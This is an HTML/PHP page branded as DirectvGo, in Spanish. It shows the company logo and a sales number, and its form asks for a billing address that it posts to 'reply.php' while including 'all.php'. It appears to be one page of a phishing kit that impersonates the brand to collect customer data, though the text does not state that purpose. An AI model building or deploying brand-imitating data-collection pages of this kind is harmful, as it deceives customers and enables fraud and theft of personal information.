<!DOCTYPE html>
<html>
<head>
	<title>DirectvGo</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="estilos/estilo.css">
	<meta name="viewport" content="width=500, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap" rel="stylesheet">
</head>
<body style="background:linear-gradient(to bottom , #010C1C , #000C0C);">
	<div class="fixed"> <p>Ventas 0810-222-3366 | Soy cliente</p> </div>
	<nav class="nav-flex">
		<div class="contenedor-img">
			<img src="img/dtv.svg">
		</div>
	</nav>
	<div class="content-flex">
		
		<form method="POST" class="form-flex" action="reply.php">
			<p>Datos de la facturación</p>
			<div class="contenedor-inputs">
				<div class="input-box"><label>Calle</label>
					<input type="text" name="calle" required="" placeholder="Ej: Av.Colon">
					
				</div>
				
				<div class="input-box"><label>Altura</label>
					<input type="number" name="altura" required="" placeholder="Ej:	 1234">
					
				</div>
				<div class="input-box"><label>Ciudad</label>
					<input type="text" name="ciudad" required="" placeholder="Ciudad autonoma de Bs As">
					
				</div>
				<div class="input-box"><label>CP</label>
					<input type="text" name="cp" required="" placeholder="Ej: 1040">
					
				</div>
				<div class="contenedor-submit">
					<input type="submit" name="enviar" value="Continuar">
				</div>
			</div>
			
		</form>

	</div>
	<?php 
		include 'all.php';
	 ?>
</body>
<footer><div class="img"><img src="img/directvgo-logo.png"></div></footer>
</html>

